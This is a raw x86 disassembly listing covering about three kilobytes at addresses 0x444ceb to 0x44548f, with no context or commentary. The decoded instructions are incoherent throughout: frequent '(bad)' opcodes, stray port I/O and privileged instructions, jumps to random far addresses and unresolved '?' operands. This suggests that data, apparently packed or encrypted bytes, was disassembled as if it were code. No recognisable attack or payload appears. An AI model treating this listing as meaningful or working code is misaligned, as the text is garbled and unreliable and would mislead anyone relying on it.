  444ceb:	mov    ebx,0x2ad2505a
  444cf0:	leave  
  444cf1:	iret   
  444cf2:	mov    bl,0x3b
  444cf4:	aam    0x2f
  444cf6:	cs mov esi,0xc91e76ae
  444cfc:	xchg   ecx,eax
  444cfd:	popa   
  444cfe:	and    bl,bh
  444d00:	dec    eax
  444d01:	iret   
  444d02:	pop    ds
  444d03:	aaa    
  444d04:	mov    esi,eax
  444d06:	(bad)  
  444d07:	xor    BYTE PTR [esp+edi*2+0x72],al
  444d0b:	shr    DWORD PTR [esi],cl
  444d0d:	mov    ecx,0x53f12d4
  444d12:	rcl    BYTE PTR [eax],1
  444d14:	xchg   edi,eax
  444d15:	je     0x444d36
  444d17:	cmp    edx,DWORD PTR [ecx]
  444d19:	dec    esi
  444d1a:	push   esi
  444d1b:	add    bh,dl
  444d1d:	push   cs
  444d1e:	popf   
  444d1f:	aam    0xd5
  444d21:	retf   0x6c04
  444d24:	inc    edx
  444d25:	sub    cl,BYTE PTR [eax+0x1f987df3]
  444d2b:	xor    eax,0x81398653
  444d30:	mov    DWORD PTR [ecx],0xfab8598b
  444d36:	pusha  
  444d37:	rcr    DWORD PTR [edx],0xde
  444d3a:	les    esp,FWORD PTR [eax-0x7ce1807f]
  444d40:	mov    ds:0x1888de6,eax
  444d45:	popf   
  444d46:	(bad)  
  444d47:	ficom  WORD PTR [ecx+ebp*1+0x6b676e42]
  444d4e:	mov    ch,0xd9
  444d50:	mov    esi,edx
  444d52:	add    ah,BYTE PTR [esi+0x41]
  444d55:	lods   eax,DWORD PTR ds:[esi]
  444d56:	outs   dx,BYTE PTR ds:[esi]
  444d57:	mov    ch,0x96
  444d59:	jno    0x444d17
  444d5b:	jb     0x444d71
  444d5d:	inc    ecx
  444d5e:	and    eax,0xc73967
  444d63:	mov    al,0x62
  444d65:	adc    al,0xa
  444d67:	ret    0x70
  444d6a:	div    BYTE PTR [ebp+0x4a]
  444d6d:	pop    edi
  444d6e:	adc    dl,bl
  444d70:	sub    esp,ebp
  444d72:	jo     0x444dea
  444d74:	mov    bl,cl
  444d76:	loopne 0x444db7
  444d78:	loop   0x444d48
  444d7a:	or     ecx,DWORD PTR [ecx+edi*8]
  444d7d:	add    eax,0xd87f8ed6
  444d82:	mov    cl,0x74
  444d84:	pop    ebp
  444d85:	and    DWORD PTR [eax+0x25],0x355646bd
  444d8c:	adc    BYTE PTR [esi+0x5e],bh
  444d8f:	aam    0x7c
  444d91:	xchg   BYTE PTR [edi+0x27],cl
  444d94:	adc    eax,DWORD PTR [eax+0x62]
  444d97:	lea    ecx,[eax-0x1add5505]
  444d9d:	jno    0x444d20
  444d9f:	loope  0x444dff
  444da1:	add    edx,DWORD PTR [eax+0x7e]
  444da4:	test   BYTE PTR [ecx],ch
  444da6:	popf   
  444da7:	jmp    0x36c1:0x8d60a156
  444dae:	mov    dh,0xdb
  444db0:	shl    BYTE PTR [esp+eiz*2],1
  444db3:	aam    0x2d
  444db5:	sub    BYTE PTR [eax-0x35ff7c3d],dh
  444dbb:	or     eax,0x27741c61
  444dc0:	push   ss
  444dc1:	xor    al,0xd5
  444dc3:	aam    0xed
  444dc5:	rcl    cl,cl
  444dc7:	mov    DWORD PTR [ebp+0x7],esi
  444dca:	mov    cl,0x25
  444dcc:	pushf  
  444dcd:	cmp    al,0x1e
  444dcf:	lods   eax,DWORD PTR ds:[esi]
  444dd0:	add    DWORD PTR [ebp-0x5c86c60e],0xffffffd7
  444dd7:	push   0x9f7d5a88
  444ddc:	rcl    bh,cl
  444dde:	hlt    
  444ddf:	(bad)  
  444de0:	scas   al,BYTE PTR es:[edi]
  444de1:	out    dx,eax
  444de2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444de3:	jge    0x444e47
  444de5:	fs stos DWORD PTR es:[edi],eax
  444de7:	out    0xe,al
  444de9:	cdq    
  444dea:	loopne 0x444df1
  444dec:	xchg   ebp,eax
  444ded:	jl     0x444e69
  444def:	dec    edi
  444df0:	pop    ss
  444df1:	fwait
  444df2:	int    0x94
  444df4:	int3   
  444df5:	cdq    
  444df6:	enter  0xaf33,0x88
  444dfa:	xor    eax,0x941560e4
  444dff:	add    eax,0x94b83479
  444e04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444e05:	adc    al,0xb3
  444e07:	or     DWORD PTR [ecx+0xb18bf4b],0xc28ce5d2
  444e11:	add    ch,ah
  444e13:	pop    es
  444e14:	into   
  444e15:	loop   0x444e27
  444e17:	aaa    
  444e18:	shr    ah,1
  444e1a:	pop    ds
  444e1b:	xor    ebp,DWORD PTR [ebx+0x5b]
  444e1e:	xlat   BYTE PTR ds:[ebx]
  444e1f:	mov    BYTE PTR cs:[esi-0x62c92bfd],dl
  444e26:	xchg   edi,eax
  444e27:	jnp    0x444e61
  444e29:	test   BYTE PTR [edi+0x60695d3c],ch
  444e2f:	jmp    0xc23b8506
  444e34:	push   edx
  444e35:	outs   dx,BYTE PTR ds:[esi]
  444e36:	sahf   
  444e37:	(bad)  
  444e38:	jp     0x444e3c
  444e3a:	lods   al,BYTE PTR ds:[esi]
  444e3b:	xor    eax,0x19a7a5f0
  444e40:	mov    esp,ecx
  444e42:	mov    esi,0x58a23a0d
  444e47:	rcr    BYTE PTR [ecx+0x2c],cl
  444e4a:	fs in  eax,dx
  444e4c:	cmc    
  444e4d:	inc    esp
  444e4e:	outs   dx,BYTE PTR ds:[esi]
  444e4f:	jmp    0xfdd2:0x47bae431
  444e56:	jo     0x444e2d
  444e58:	jmp    0x91b6523c
  444e5d:	jmp    0x444e7e
  444e5f:	aaa    
  444e60:	arpl   WORD PTR [ebx],si
  444e62:	and    bh,BYTE PTR [eax-0x4769eac6]
  444e68:	rol    bl,1
  444e6a:	xchg   edx,eax
  444e6b:	cmp    al,0xd5
  444e6d:	lods   al,BYTE PTR ds:[esi]
  444e6e:	mov    al,ds:0xcb7282eb
  444e73:	das    
  444e74:	mov    edi,edi
  444e76:	js     0x444e48
  444e78:	test   al,0xa8
  444e7a:	push   0x43078775
  444e7f:	and    al,0x2
  444e81:	dec    esi
  444e82:	push   ds
  444e83:	popa   
  444e84:	cs into 
  444e86:	aas    
  444e87:	adc    BYTE PTR [esi],bl
  444e89:	xor    dl,BYTE PTR [esi-0x2deb72df]
  444e8f:	int3   
  444e90:	inc    ecx
  444e91:	cs mov edi,0xab27c09
  444e97:	xlat   BYTE PTR ds:[ebx]
  444e98:	lock mov bl,0xc8
  444e9b:	adc    al,0xf8
  444e9d:	retf   
  444e9e:	sbb    BYTE PTR [ecx+0x6246f38b],bl
  444ea4:	test   DWORD PTR [ebx+0x49],ecx
  444ea7:	push   ds
  444ea8:	pusha  
  444ea9:	add    esi,DWORD PTR [ecx-0x2c]
  444eac:	bound  esi,QWORD PTR [edi+0x6a]
  444eaf:	es enter 0x56f5,0xf
  444eb4:	dec    esp
  444eb5:	and    esp,DWORD PTR [ecx+0x9]
  444eb8:	inc    ebx
  444eb9:	aas    
  444eba:	daa    
  444ebb:	pop    ebp
  444ebc:	cld    
  444ebd:	cmp    eax,0x2455ee6
  444ec2:	outs   dx,BYTE PTR ds:[esi]
  444ec3:	ss push ss
  444ec5:	xchg   esp,eax
  444ec6:	lds    esi,FWORD PTR [esp+ecx*1+0x6c7f60b1]
  444ecd:	xor    DWORD PTR [esi],ecx
  444ecf:	jb     0x444ee1
  444ed1:	mov    eax,ds:0x40839af4
  444ed6:	xor    edx,edi
  444ed8:	xor    eax,0x9015d9cf
  444edd:	lea    esp,[edi+0x53]
  444ee0:	inc    edi
  444ee1:	loop   0x444f33
  444ee3:	pop    edi
  444ee4:	mov    cs,eax
  444ee6:	mov    es,WORD PTR [eax+eiz*2-0x50]
  444eea:	call   ebp
  444eec:	(bad)  
  444eed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444eee:	(bad)  
  444eef:	mov    dh,0xfd
  444ef1:	push   0x78
  444ef3:	mov    DWORD PTR fs:[ebx],ebx
  444ef6:	sub    bl,BYTE PTR [ebx]
  444ef8:	mov    edi,0xcdbdb55f
  444efd:	add    eax,0x46a8576c
  444f02:	mov    al,fs:0x291e3ec7
  444f08:	int    0x8
  444f0a:	pop    es
  444f0b:	into   
  444f0c:	repnz mov dh,0x3
  444f0f:	aam    0x55
  444f11:	sbb    BYTE PTR [ebx+0x2],bh
  444f14:	and    ebp,DWORD PTR [esi+0x45]
  444f17:	sub    cl,BYTE PTR [ecx-0x5e0c48f9]
  444f1d:	loopne 0x444f5b
  444f1f:	rcl    edx,cl
  444f21:	xor    al,0xd6
  444f23:	mov    edx,0x1b6802f6
  444f28:	mov    ecx,0xca62bda9
  444f2d:	or     ch,BYTE PTR [edi+ecx*8]
  444f30:	push   esp
  444f31:	fdivr  QWORD PTR [esi+0x45]
  444f34:	into   
  444f35:	mov    ah,0xda
  444f37:	adc    eax,0x6dc93d1
  444f3c:	unpckhps xmm5,XMMWORD PTR [eax-0x56]
  444f40:	scas   al,BYTE PTR es:[edi]
  444f41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444f42:	adc    BYTE PTR [eax+ebp*1+0x5b],0x5
  444f47:	cmc    
  444f48:	mov    BYTE PTR [ebx+0x487559dc],al
  444f4e:	sbb    al,0x47
  444f50:	xor    eax,0xabd1be57
  444f55:	add    eax,0x16168698
  444f5a:	lea    esp,[ecx-0x6b]
  444f5d:	or     esp,DWORD PTR [edx+0x6b]
  444f60:	jecxz  0x444f64
  444f62:	call   0xa9e21bb9
  444f67:	aad    0x6b
  444f69:	jae    0x444f0c
  444f6b:	jne    0x444f6b
  444f6d:	ret    0xdcbf
  444f70:	mov    BYTE PTR [ebx+0x71],dh
  444f73:	jns    0x444f76
  444f75:	mov    edi,0x24b30f61
  444f7a:	inc    edx
  444f7b:	push   0x6e
  444f7d:	cli    
  444f7e:	loopne 0x444f88
  444f80:	dec    eax
  444f81:	xor    eax,0xb18fe3e8
  444f86:	xchg   edx,edx
  444f88:	aaa    
  444f89:	xchg   ebx,eax
  444f8a:	outs   dx,DWORD PTR ds:[esi]
  444f8b:	xchg   ebp,eax
  444f8c:	push   esp
  444f8d:	pop    esi
  444f8e:	iret   
  444f8f:	aam    0xce
  444f91:	hlt    
  444f92:	stos   BYTE PTR es:[edi],al
  444f93:	jge    0x444f7d
  444f95:	lahf   
  444f96:	mov    ?,ebx
  444f98:	test   al,0x86
  444f9a:	pusha  
  444f9b:	adc    eax,ecx
  444f9d:	imul   ebx,DWORD PTR [edi+0x4a],0x7c
  444fa1:	sbb    bh,BYTE PTR [ebp-0x7]
  444fa4:	(bad)  
  444fa5:	into   
  444fa6:	fcmovnbe st,st(4)
  444fa8:	cli    
  444fa9:	xchg   DWORD PTR [eax],eax
  444fab:	adc    al,0x88
  444fad:	or     ebp,DWORD PTR [esi]
  444faf:	mov    ecx,0x7c5a96a2
  444fb4:	(bad)  
  444fb5:	jno    0x444f3d
  444fb7:	jae    0x444f43
  444fb9:	adc    esp,DWORD PTR [edx-0x71d9efb5]
  444fbf:	les    ebx,FWORD PTR [ecx]
  444fc1:	cmp    eax,0xa4889b57
  444fc6:	pusha  
  444fc7:	gs push ds
  444fc9:	mov    ?,WORD PTR [edi+edi*1-0x5a7ffc73]
  444fd0:	sub    DWORD PTR [ebx+0x2b75397],edi
  444fd6:	push   ebx
  444fd7:	mov    cl,0x1
  444fd9:	loop   0x445048
  444fdb:	dec    edx
  444fdc:	fisubr DWORD PTR [edi]
  444fde:	inc    esp
  444fdf:	sbb    BYTE PTR [ecx+esi*8-0x32],0xd7
  444fe4:	push   cs
  444fe5:	jo     0x444f7c
  444fe7:	cmp    al,0x78
  444fe9:	xchg   ecx,eax
  444fea:	(bad)  
  444fec:	out    dx,eax
  444fed:	mov    ebp,edx
  444fef:	out    0x78,al
  444ff1:	(bad)  
  444ff2:	jmp    0x2f99d904
  444ff7:	add    al,0x1e
  444ff9:	stos   DWORD PTR es:[edi],eax
  444ffa:	or     DWORD PTR [edx],ecx
  444ffc:	dec    esi
  444ffd:	add    esi,DWORD PTR [edx]
  444fff:	(bad)  
  445000:	inc    edx
  445001:	jns    0x444f93
  445003:	jmp    0x44502b
  445005:	je     0x44502d
  445007:	(bad)
  44500b:	or     BYTE PTR [esi-0x6c7924f9],al
  445011:	adc    al,0x76
  445013:	inc    bp
  445015:	or     DWORD PTR [esi-0x76],ecx
  445018:	aam    0x69
  44501a:	lahf   
  44501b:	cmc    
  44501c:	cmc    
  44501d:	xor    DWORD PTR [ebp+0x195b9682],edi
  445023:	mov    gs,edi
  445025:	add    dh,BYTE PTR [ebx]
  445027:	and    eax,0xd65e103e
  44502c:	arpl   WORD PTR [ecx-0x7c054b67],bp
  445032:	(bad)  
  445033:	in     eax,dx
  445034:	outs   dx,DWORD PTR ds:[esi]
  445035:	(bad)  
  445036:	pop    ds
  445037:	fcomip st,st(5)
  445039:	sub    BYTE PTR [ebx+0x60],ah
  44503c:	sub    ah,dl
  44503e:	in     eax,dx
  44503f:	popf   
  445040:	mov    bh,0xbf
  445042:	ins    DWORD PTR es:[edi],dx
  445043:	push   ebp
  445044:	mov    ds:0xb1cb3bf7,al
  445049:	aas    
  44504a:	ins    DWORD PTR es:[edi],dx
  44504b:	scas   eax,DWORD PTR es:[edi]
  44504c:	jo     0x445070
  44504e:	xor    ebp,DWORD PTR [ebp+0x17fee828]
  445054:	pop    esi
  445055:	push   ds
  445056:	pusha  
  445057:	sbb    al,0x9c
  445059:	adc    ch,cl
  44505b:	or     DWORD PTR [eax+0x41],ecx
  44505e:	mov    edi,0xb22f88b0
  445063:	dec    ebx
  445064:	sbb    eax,0xfe93a2b1
  445069:	add    eax,0x203a98d2
  44506e:	cmp    BYTE PTR ds:0x39bbd141,dl
  445074:	pop    ss
  445075:	imul   edx,DWORD PTR [ecx-0x388daf47],0x14
  44507c:	jae    0x445021
  44507e:	lds    edx,FWORD PTR [eax-0x2ed9e70a]
  445084:	jle    0x445055
  445086:	retf   
  445087:	push   esp
  445088:	add    al,0xdb
  44508a:	rep stos DWORD PTR es:[edi],eax
  44508c:	inc    ecx
  44508d:	out    dx,eax
  44508e:	add    bh,BYTE PTR [eax-0x78]
  445091:	jnp    0x44509d
  445093:	ror    BYTE PTR ds:[edx],cl
  445096:	(bad)  
  445098:	xchg   ebx,eax
  445099:	add    dh,ah
  44509b:	mov    esp,DWORD PTR [edx-0x49]
  44509e:	sub    esi,edx
  4450a0:	dec    ebx
  4450a1:	(bad)  [esi+eiz*2]
  4450a4:	mov    BYTE PTR [ebp-0x6604e467],dh
  4450aa:	in     al,0x87
  4450ac:	inc    esp
  4450ad:	xchg   edx,eax
  4450ae:	ins    DWORD PTR es:[edi],dx
  4450af:	not    DWORD PTR [ebp+eax*1-0x467776d3]
  4450b6:	add    BYTE PTR [esi+0x11],dl
  4450b9:	rcr    BYTE PTR [edi],cl
  4450bb:	rcpps  xmm4,XMMWORD PTR [ebp-0x49]
  4450bf:	stc    
  4450c0:	pop    esi
  4450c1:	sub    al,0xf2
  4450c3:	aam    0x1d
  4450c5:	enter  0x88e8,0xca
  4450c9:	arpl   WORD PTR [edx],bx
  4450cb:	pop    es
  4450cc:	mov    cl,al
  4450ce:	loope  0x4450c2
  4450d0:	sub    dh,BYTE PTR [eax]
  4450d2:	in     al,0xdd
  4450d4:	and    al,0x3
  4450d6:	sbb    ah,BYTE PTR [edx-0xd]
  4450d9:	das    
  4450da:	cli    
  4450db:	daa    
  4450dc:	pop    edi
  4450dd:	ret    0xa399
  4450e0:	js     0x4450e5
  4450e2:	dec    esi
  4450e3:	mov    DWORD PTR [edi],ebp
  4450e5:	push   eax
  4450e6:	jmp    0xc46fefd
  4450eb:	pop    esi
  4450ec:	push   edx
  4450ed:	push   ebx
  4450ee:	add    DWORD PTR [edi-0x2e8bca92],ebp
  4450f4:	mov    ch,0xa
  4450f6:	dec    eax
  4450f7:	aam    0x4d
  4450f9:	vmovups xmm0,xmm7
  4450fd:	add    bl,BYTE PTR [edi+ebx*4-0x821db74]
  445104:	push   ds
  445105:	sahf   
  445106:	pop    ss
  445107:	(bad)
  44510b:	xchg   esp,eax
  44510c:	clc    
  44510d:	xor    DWORD PTR [esi+0x57],esi
  445110:	into   
  445111:	add    eax,edx
  445113:	ins    BYTE PTR es:[edi],dx
  445114:	outs   dx,BYTE PTR ds:[esi]
  445115:	out    dx,al
  445116:	cs push ebx
  445118:	aaa    
  445119:	repz jl 0x445177
  44511c:	mov    BYTE PTR [ecx],dh
  44511e:	ins    DWORD PTR es:[edi],dx
  44511f:	sahf   
  445120:	clc    
  445121:	xchg   DWORD PTR [esi],edi
  445123:	sti    
  445124:	popa   
  445125:	add    ah,ah
  445127:	mov    edi,0x7d86dfed
  44512c:	adc    al,0x80
  44512e:	pop    ds
  44512f:	push   ebx
  445130:	retfw  
  445132:	ss out 0x68,eax
  445135:	pop    edi
  445136:	inc    esi
  445137:	aam    0x9d
  445139:	mov    ah,0xcb
  44513b:	jecxz  0x4450d9
  44513d:	jg     0x445107
  44513f:	in     al,dx
  445140:	xchg   BYTE PTR [ecx],dh
  445142:	inc    esi
  445143:	adc    ebx,ecx
  445145:	fadd   QWORD PTR [eax]
  445147:	pusha  
  445148:	mov    dl,0xbd
  44514a:	(bad)  
  44514c:	fld    DWORD PTR [edx-0x20]
  44514f:	retf   
  445150:	shl    edi,cl
  445152:	fist   WORD PTR [ebp+eiz*1+0x4d]
  445156:	mov    edi,0xfd4d88af
  44515b:	add    dh,al
  44515d:	fcmovne st,st(2)
  44515f:	psubd  mm0,QWORD PTR [edx]
  445162:	hlt    
  445163:	rcl    DWORD PTR [ebp+0x1b],1
  445166:	ja     0x445195
  445168:	xor    al,0xfc
  44516a:	xchg   edx,eax
  44516b:	(bad)  
  44516c:	pop    eax
  44516d:	add    cl,BYTE PTR [ebp-0x6c]
  445170:	enter  0x6da8,0xe1
  445174:	retf   
  445175:	data16 (bad) 
  445178:	in     eax,0x17
  44517a:	sub    al,0x51
  44517c:	dec    edx
  44517d:	add    dh,bh
  44517f:	fs xchg esp,eax
  445181:	fwait
  445182:	pusha  
  445183:	aaa    
  445184:	pop    eax
  445185:	repnz sar DWORD PTR [edi+0x6e],1
  445189:	sahf   
  44518a:	fst    st(4)
  44518c:	and    eax,0xf26055da
  445191:	push   ds
  445192:	mov    BYTE PTR [ecx+0x2c020389],bl
  445198:	icebp  
  445199:	sbb    ebp,DWORD PTR [edi+0x4c]
  44519c:	inc    esi
  44519d:	add    dl,BYTE PTR [edx+ebp*4]
  4451a0:	mov    bh,0xd
  4451a2:	sahf   
  4451a3:	cld    
  4451a4:	lds    edx,FWORD PTR [eax+0x64]
  4451a7:	out    dx,eax
  4451a8:	mov    esi,0x69522708
  4451ad:	jae    0x4451f8
  4451af:	(bad)  
  4451b0:	cwde   
  4451b1:	xor    eax,0xd6cd73d
  4451b6:	(bad)  
  4451b7:	lahf   
  4451b8:	test   BYTE PTR [ebp-0x2],ch
  4451bb:	sbb    bh,BYTE PTR [ecx+0x45]
  4451be:	push   esi
  4451bf:	dec    ecx
  4451c0:	int3   
  4451c1:	jle    0x445240
  4451c3:	(bad)  
  4451c4:	xor    BYTE PTR [ecx-0x6f40b2f7],al
  4451ca:	loopne 0x445226
  4451cc:	ins    BYTE PTR es:[edi],dx
  4451cd:	push   cs
  4451ce:	pop    es
  4451cf:	inc    DWORD PTR [ebx+0x3f49141b]
  4451d5:	fs je  0x4451ad
  4451d8:	in     eax,dx
  4451d9:	cdq    
  4451da:	or     al,0xe9
  4451dc:	mov    ecx,DWORD PTR [ebx-0x639cdf1]
  4451e2:	imul   eax,DWORD PTR [eax],0x9f688128
  4451e8:	pushf  
  4451e9:	nop
  4451ea:	adc    eax,0x2db7a9d7
  4451ef:	mov    edi,0x459a6c59
  4451f4:	pusha  
  4451f5:	add    edx,DWORD PTR [edx-0x6dcd6bfd]
  4451fb:	or     bh,BYTE PTR [edx+0x3]
  4451fe:	sbb    al,0x8e
  445200:	pop    esp
  445201:	pushf  
  445202:	pop    esi
  445203:	popa   
  445204:	ins    BYTE PTR es:[edi],dx
  445205:	loop   0x445275
  445207:	or     eax,0xcff386f9
  44520c:	sub    ebp,ecx
  44520e:	fsub   QWORD PTR [esi-0x62]
  445211:	pop    ss
  445212:	lock push ebx
  445214:	pop    ebx
  445215:	mov    eax,ds:0xe486548e
  44521a:	icebp  
  44521b:	test   al,0x88
  44521d:	stos   DWORD PTR es:[edi],eax
  44521e:	sbb    BYTE PTR [edi-0x34],ah
  445221:	daa    
  445222:	xchg   ebx,eax
  445223:	adc    esp,edx
  445225:	add    cl,BYTE PTR [edx]
  445227:	jo     0x445294
  445229:	push   ecx
  44522a:	fwait
  44522b:	sbb    al,0x51
  44522d:	xchg   ecx,eax
  44522e:	pop    ds
  44522f:	imul   esi,ebx,0x821d2a7a
  445235:	jno    0x44522c
  445237:	lahf   
  445238:	out    0x3a,al
  44523a:	push   0x2a
  44523c:	adc    dh,BYTE PTR [ecx]
  44523e:	ja     0x445254
  445240:	xchg   DWORD PTR [ebp-0x26768d39],esi
  445246:	fs mov ds,ebx
  445249:	mov    dh,0x8b
  44524b:	fstp   TBYTE PTR [esi+0x2]
  44524e:	push   esi
  44524f:	lods   eax,DWORD PTR ds:[esi]
  445250:	bound  edx,QWORD PTR [eax]
  445252:	mov    WORD PTR [eax+0x51],fs
  445255:	sub    ebx,DWORD PTR [edi]
  445257:	jge    0x445288
  445259:	mov    dl,ah
  44525b:	push   ebx
  44525c:	dec    eax
  44525d:	ds jge 0x4451ff
  445260:	xor    ch,BYTE PTR [eax]
  445262:	rcl    BYTE PTR [edx+eiz*2+0x2d],cl
  445266:	mov    WORD PTR [ecx+0x1d],es
  445269:	imul   BYTE PTR [esi-0x7d]
  44526c:	jl     0x445250
  44526e:	pop    esi
  44526f:	mov    eax,0x60d8c7a9
  445274:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445275:	cli    
  445276:	jp     0x4452d1
  445278:	sbb    ah,BYTE PTR [ecx]
  44527a:	push   ds
  44527b:	imul   ecx,DWORD PTR [esi+0x34],0x331725e4
  445282:	pop    edx
  445283:	mov    DWORD PTR [edx],0xa1c29fa7
  445289:	hlt    
  44528a:	push   esp
  44528b:	sub    eax,0xba421f8b
  445290:	ins    DWORD PTR es:[edi],dx
  445291:	xchg   esp,eax
  445292:	mov    edx,0xdcb898e5
  445297:	fnsave [ecx-0x77ce91b3]
  44529d:	out    dx,eax
  44529e:	and    BYTE PTR es:[esi],bl
  4452a1:	add    al,0xa2
  4452a3:	aad    0x1f
  4452a5:	jge    0x4452b7
  4452a7:	cmp    al,0xc7
  4452a9:	mov    ?,ebp
  4452ab:	xchg   BYTE PTR [ecx],dh
  4452ad:	enter  0xc879,0x88
  4452b1:	mov    DWORD PTR [ecx+0x759dc1c8],edi
  4452b7:	mov    cs,eax
  4452b9:	in     eax,dx
  4452ba:	push   cs
  4452bb:	lods   eax,DWORD PTR ds:[esi]
  4452bc:	adc    BYTE PTR [ebp-0x21],ch
  4452bf:	out    dx,al
  4452c0:	out    0xea,al
  4452c2:	mov    al,ds:0x1e3e867c
  4452c7:	jns    0x44525b
  4452c9:	add    DWORD PTR [ecx],ebx
  4452cb:	xchg   BYTE PTR [edx+0x28d5b589],al
  4452d1:	push   0x8b0789a7
  4452d6:	ins    BYTE PTR es:[edi],dx
  4452d7:	or     eax,0xd3145189
  4452dc:	add    edi,DWORD PTR ds:0x348ed63
  4452e2:	jp     0x445348
  4452e4:	xor    al,0x36
  4452e6:	gs jb  0x445358
  4452e9:	loopne 0x4452ed
  4452eb:	cmp    BYTE PTR [esi+edi*8+0x60],bh
  4452ef:	stc    
  4452f0:	adc    ah,ah
  4452f2:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4452f4:	push   si
  4452f6:	int    0xe4
  4452f8:	fiadd  WORD PTR [edx]
  4452fa:	sbb    ch,BYTE PTR [ecx-0x61]
  4452fd:	mov    al,0x81
  4452ff:	adc    al,0x42
  445301:	leave  
  445302:	mov    eax,fs:0x932dd6c
  445308:	sub    DWORD PTR [eax],eax
  44530a:	and    eax,0xbf4416cb
  44530f:	jg     0x44534b
  445311:	add    esp,DWORD PTR [eax]
  445313:	xchg   ecx,eax
  445314:	jns    0x445345
  445316:	dec    esi
  445317:	mov    edx,0x1d0e7f75
  44531c:	mov    bh,0x6b
  44531e:	cmp    ebp,0x15a81106
  445324:	test   al,0x24
  445326:	(bad)  
  445327:	jge    0x4452b5
  445329:	mov    BYTE PTR ds:0x99cf9606,dh
  44532f:	(bad)  
  445330:	or     BYTE PTR [esi],dl
  445332:	sub    DWORD PTR [edi],0xfffffffc
  445335:	popw   ds
  445337:	fwait
  445338:	xor    cl,BYTE PTR [esp+0x50]
  44533c:	jg     0x4452ea
  44533e:	test   DWORD PTR ds:0xc11f34f9,0x35efa515
  445348:	fbstp  TBYTE PTR [edi+0x1e]
  44534b:	adc    eax,0x837cae79
  445350:	shr    dl,1
  445352:	mov    ebx,0xfb5075d1
  445357:	inc    esp
  445358:	xor    al,0xba
  44535a:	out    0xa5,al
  44535c:	stos   BYTE PTR es:[edi],al
  44535d:	fs or  al,0x7
  445360:	lock or al,0x60
  445363:	fild   WORD PTR [esi-0x25f11683]
  445369:	hlt    
  44536a:	mov    edi,0x7758b89e
  44536f:	push   esp
  445370:	jle    0x445306
  445372:	sti    
  445373:	mov    bl,0xc9
  445375:	std    
  445376:	pop    ds
  445377:	xor    eax,0x392d18a9
  44537c:	push   edi
  44537d:	ror    al,cl
  44537f:	pop    edx
  445380:	aas    
  445381:	push   ds
  445382:	pop    ds
  445383:	in     eax,0x17
  445385:	lods   eax,DWORD PTR ds:[esi]
  445386:	jge    0x4453ba
  445388:	fucom  st(3)
  44538a:	pop    ds
  44538b:	adc    DWORD PTR [eax-0x23],esp
  44538e:	xor    edx,DWORD PTR [edi-0xa]
  445391:	les    ebx,FWORD PTR [edx+edx*8+0x5fe85ba7]
  445398:	scas   al,BYTE PTR es:[edi]
  445399:	pop    ebx
  44539a:	pand   mm5,QWORD PTR [esi]
  44539d:	(bad)  
  44539e:	pusha  
  44539f:	in     eax,dx
  4453a0:	xchg   edx,edi
  4453a2:	pop    esp
  4453a3:	dec    DWORD PTR [esp+esi*4-0x208c2aad]
  4453aa:	ja     0x44532c
  4453ac:	and    dl,BYTE PTR [edx]
  4453ae:	hlt    
  4453af:	mov    ah,BYTE PTR [ebp-0x777076b7]
  4453b5:	xchg   ebx,eax
  4453b6:	sub    BYTE PTR [ecx-0x2c],cl
  4453b9:	and    al,0xfc
  4453bb:	aad    0x63
  4453bd:	push   ebp
  4453be:	xchg   ebp,eax
  4453bf:	adc    BYTE PTR [edx],dl
  4453c1:	retf   
  4453c2:	sti    
  4453c3:	or     DWORD PTR [ebx+0x21acbc55],ecx
  4453c9:	jmp    0x29459b50
  4453ce:	out    dx,eax
  4453cf:	pop    ebp
  4453d0:	pop    es
  4453d1:	outs   dx,DWORD PTR ds:[esi]
  4453d2:	mov    edx,0x70029c3d
  4453d7:	xchg   BYTE PTR [eax-0x3a],ch
  4453da:	xchg   ebp,eax
  4453db:	adc    eax,0x338bd89
  4453e0:	pop    ss
  4453e1:	sub    DWORD PTR [esi],edx
  4453e3:	jno    0x445394
  4453e5:	add    eax,0x69f431c6
  4453ea:	cmp    al,0xc5
  4453ec:	mov    bh,0xd3
  4453ee:	pusha  
  4453ef:	inc    ebp
  4453f0:	(bad)  
  4453f2:	ror    DWORD PTR [edi+0x22],cl
  4453f5:	pop    esi
  4453f6:	bound  edi,QWORD PTR [ebx-0x1da57661]
  4453fc:	or     ebp,ecx
  4453fe:	ret    
  4453ff:	in     al,dx
  445400:	xor    DWORD PTR [esi],ebp
  445402:	push   ds
  445403:	aas    
  445404:	jp     0x445398
  445406:	bnd jmp 0x4453d9
  445409:	lea    edi,[edi-0x3a76d52b]
  44540f:	jne    0x445421
  445411:	sbb    al,0x3e
  445413:	mov    edi,0xfa1acf78
  445418:	test   eax,0x8d9360c6
  44541d:	and    al,BYTE PTR [ebp+0x4d0c7850]
  445423:	stc    
  445424:	add    BYTE PTR [edx],al
  445426:	retf   0x4b61
  445429:	or     ebx,DWORD PTR [ecx]
  44542b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44542c:	sti    
  44542d:	ds or  eax,0xfe1f89ac
  445433:	ins    BYTE PTR es:[edi],dx
  445434:	(bad)  
  445435:	sub    BYTE PTR [ebx+eiz*8],bl
  445438:	xchg   edi,eax
  445439:	add    eax,0xd322c052
  44543e:	call   0x180dc0fc
  445443:	std    
  445444:	mov    DWORD PTR [ebx-0x44],edx
  445447:	lds    ebp,FWORD PTR [edx+0x5c003c2c]
  44544d:	add    eax,0xb48dd49b
  445452:	stos   BYTE PTR es:[edi],al
  445453:	or     al,0x5c
  445455:	sub    dl,0x9b
  445458:	mov    DWORD PTR [edi-0x20c8ef9f],ecx
  44545e:	xor    bl,BYTE PTR [esi-0x5e]
  445461:	add    bl,BYTE PTR [edx]
  445463:	ret    0x3d3
  445466:	nop
  445467:	retf   
  445468:	push   DWORD PTR [edi+ebx*1+0x3b]
  44546c:	shl    DWORD PTR [ecx],0xa2
  44546f:	mov    BYTE PTR [esi-0x3b2bc1e0],al
  445475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445476:	push   edx
  445477:	cmp    al,0x24
  445479:	cld    
  44547a:	mov    dh,0x4
  44547c:	mov    cl,0xdf
  44547e:	ret    0x888f
  445481:	retf   
  445482:	das    
  445483:	sbb    edi,DWORD PTR [eax-0x682bfea1]
  445489:	ficom  WORD PTR [ebx-0x21e35665]
  44548f:	adc    al,0xf5
